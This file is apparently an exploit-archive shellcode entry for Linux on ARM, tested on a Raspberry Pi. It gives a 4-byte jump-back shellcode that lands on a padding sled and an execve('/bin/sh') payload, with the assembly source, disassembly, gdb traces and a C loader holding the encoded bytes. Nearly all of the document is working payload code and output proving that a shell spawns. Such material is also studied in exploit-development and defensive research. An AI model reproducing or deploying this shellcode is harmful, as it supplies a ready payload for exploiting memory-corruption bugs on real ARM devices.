/*
# Title:  Linux/ARM - Jump Back Shellcode + execve("/bin/sh", NULL, NULL) Shellcode (4 Bytes)
# Date:   2018-09-18
# Author: Ken Kitahara
# Tested: armv7l (Raspberry Pi 3 Model B+)


[System Information]
pi@raspberrypi:~ $ uname -a
Linux raspberrypi 4.14.52-v7+ #1123 SMP Wed Jun 27 17:35:49 BST 2018 armv7l GNU/Linux
pi@raspberrypi:~ $ lsb_release -a
No LSB modules are available.
Distributor ID:	Raspbian
Description:	Raspbian GNU/Linux 9.4 (stretch)
Release:	9.4
Codename:	stretch
pi@raspberrypi:~ $


[Shellcode]
(1) Use "eor  r7, r7, r7" Shellcode as Padding Shellcode (4 Bytes)
pi@raspberrypi:~ $ cat padding.s
.section .text
.global _start

_start:
    eor  r7, r7, r7
pi@raspberrypi:~ $ as -o padding.o padding.s && ld -N -o padding padding.o
pi@raspberrypi:~ $ objdump -d ./padding

./padding:     file format elf32-littlearm


Disassembly of section .text:

00010054 <_start>:
   10054:	e0277007 	eor	r7, r7, r7
pi@raspberrypi:~ $


(2) execve("/bin/sh", NULL, NULL) Shellcode (27 Bytes)
pi@raspberrypi:~ $ cat shell.s
.section .text
.global _start

    _start:
    .ARM
    add  r3, pc, #1
    bx   r3

    .THUMB
    // execve("/bin/sh", NULL, NULL)
    adr  r0, spawn
    eor  r1, r1, r1
    eor  r2, r2, r2
    strb r2, [r0, #endline-spawn]
    mov  r7, #11
    svc  #1

spawn:
.ascii "/bin/sh"
endline:
pi@raspberrypi:~ $ as -o shell.o shell.s && ld -N -o shell shell.o
pi@raspberrypi:~ $ objdump -d ./shell

./shell:     file format elf32-littlearm


Disassembly of section .text:

00010054 <_start>:
   10054:	e28f3001 	add	r3, pc, #1
   10058:	e12fff13 	bx	r3
   1005c:	a002      	add	r0, pc, #8	; (adr r0, 10068 <spawn>)
   1005e:	4049      	eors	r1, r1
   10060:	4052      	eors	r2, r2
   10062:	71c2      	strb	r2, [r0, #7]
   10064:	270b      	movs	r7, #11
   10066:	df01      	svc	1

00010068 <spawn>:
   10068:	6e69622f 	.word	0x6e69622f
   1006c:	732f      	.short	0x732f
   1006e:	68          	.byte	0x68

0001006f <endline>:
	...
pi@raspberrypi:~ $ ./shell
$ id
uid=1000(pi) gid=1000(pi) groups=1000(pi),4(adm),20(dialout),24(cdrom),27(sudo),29(audio),44(video),46(plugdev),60(games),100(users),101(input),108(netdev),997(gpio),998(i2c),999(spi)
$ exit
pi@raspberrypi:~ $


(3) Jump Back Shellcode (4 Bytes)
pi@raspberrypi:~ $ cat jmpback.s
.section .text
.global _start

_start:
    // Jump back 0x30 bytes from _start address.
    sub  pc, pc, #0x30+0x08
pi@raspberrypi:~ $ as -o jmpback.o jmpback.s && ld -N -o jmpback jmpback.o
pi@raspberrypi:~ $ objdump -d ./jmpback

./jmpback:     file format elf32-littlearm


Disassembly of section .text:

00010054 <_start>:
   10054:	e24ff038 	sub	pc, pc, #56	; 0x38
pi@raspberrypi:~ $


[Operation Test]
pi@raspberrypi:~ $ ./loader
Shellcode Length: 4
$ id
uid=1000(pi) gid=1000(pi) groups=1000(pi),4(adm),20(dialout),24(cdrom),27(sudo),29(audio),44(video),46(plugdev),60(games),100(users),101(input),108(netdev),997(gpio),998(i2c),999(spi)
$ exit
pi@raspberrypi:~ $ gdb -q ./loader
GEF for linux ready, type `gef' to start, `gef config' to configure
69 commands loaded for GDB 7.12.0.20161007-git using Python engine 3.5
[*] 1 commands could not be loaded, run `gef missing` to know why.
Reading symbols from ./loader...(no debugging symbols found)...done.
gef➤  disass main
Dump of assembler code for function main:
   0x00010470 <+0>:	push	{r11, lr}
   0x00010474 <+4>:	add	r11, sp, #4
   0x00010478 <+8>:	sub	sp, sp, #8
   0x0001047c <+12>:	ldr	r0, [pc, #44]	; 0x104b0 <main+64>
   0x00010480 <+16>:	bl	0x10330 <strlen@plt>
   0x00010484 <+20>:	mov	r3, r0
   0x00010488 <+24>:	mov	r1, r3
   0x0001048c <+28>:	ldr	r0, [pc, #32]	; 0x104b4 <main+68>
   0x00010490 <+32>:	bl	0x1030c <printf@plt>
   0x00010494 <+36>:	ldr	r3, [pc, #20]	; 0x104b0 <main+64>
   0x00010498 <+40>:	str	r3, [r11, #-8]
   0x0001049c <+44>:	ldr	r3, [r11, #-8]
   0x000104a0 <+48>:	blx	r3
   0x000104a4 <+52>:	nop			; (mov r0, r0)
   0x000104a8 <+56>:	sub	sp, r11, #4
   0x000104ac <+60>:	pop	{r11, pc}
   0x000104b0 <+64>:	andeq	r1, r2, r8, rrx
   0x000104b4 <+68>:	andeq	r0, r1, r8, lsr #10
End of assembler dump.
gef➤  b *main+48
Breakpoint 1 at 0x104a0
gef➤  r
Starting program: /home/pi/loader
Shellcode Length: 4

--snip--

Breakpoint 1, 0x000104a0 in main ()
gef➤  si

--snip--

────────────────────────────────────────────────────────────────[ code:arm ]────
      0x2105c <shell+48>       svcle  0x0001270b
      0x21060 <shell+52>       cdpvs  2,  6,  cr6,  cr9,  cr15,  {1}
      0x21064 <shell+56>       rsbeq  r7,  r8,  pc,  lsr #6
 →    0x21068 <sc+0>           sub    pc,  pc,  #56	; 0x38
      0x2106c <sc+4>           andeq  r0,  r0,  r0

--snip--

gef➤  i r pc
pc             0x21068	0x21068 <sc>
gef➤  si

--snip--

────────────────────────────────────────────────────────────────[ code:arm ]────
      0x2102c <shell+0>        eor    r7,  r7,  r7
      0x21030 <shell+4>        eor    r7,  r7,  r7
      0x21034 <shell+8>        eor    r7,  r7,  r7
 →    0x21038 <shell+12>       eor    r7,  r7,  r7
      0x2103c <shell+16>       eor    r7,  r7,  r7
      0x21040 <shell+20>       eor    r7,  r7,  r7

--snip--

gef➤  i r pc
pc             0x21038	0x21038 <shell+12>
gef➤  c
Continuing.
process 968 is executing new program: /bin/dash
$ id
uid=1000(pi) gid=1000(pi) groups=1000(pi),4(adm),20(dialout),24(cdrom),27(sudo),29(audio),44(video),46(plugdev),60(games),100(users),101(input),108(netdev),997(gpio),998(i2c),999(spi)
$ exit
[Inferior 1 (process 968) exited normally]
gef➤  q
pi@raspberrypi:~ $

*/

#include<stdio.h>
#include<string.h>

unsigned char shell[] = \
// Use "eor  r7, r7, r7" Shellcode as Padding Shellcode (4 Bytes * 8)
"\x07\x70\x27\xe0\x07\x70\x27\xe0"
"\x07\x70\x27\xe0\x07\x70\x27\xe0"
"\x07\x70\x27\xe0\x07\x70\x27\xe0"
"\x07\x70\x27\xe0\x07\x70\x27\xe0"
// execve("/bin/sh", NULL, NULL) Shellcode (27 Bytes)
"\x01\x30\x8f\xe2\x13\xff\x2f\xe1"
"\x02\xa0\x49\x40\x52\x40\xc2\x71"
"\x0b\x27\x01\xdf\x2f\x62\x69\x6e"
"\x2f\x73\x68";

// Jump Back Shellcode (4 Bytes)
unsigned char sc[] = \
"\x38\xf0\x4f\xe2";

void main()
{
    printf("Shellcode Length: %d\n", strlen(sc));

    int (*ret)() = (int(*)())sc;

    ret();
}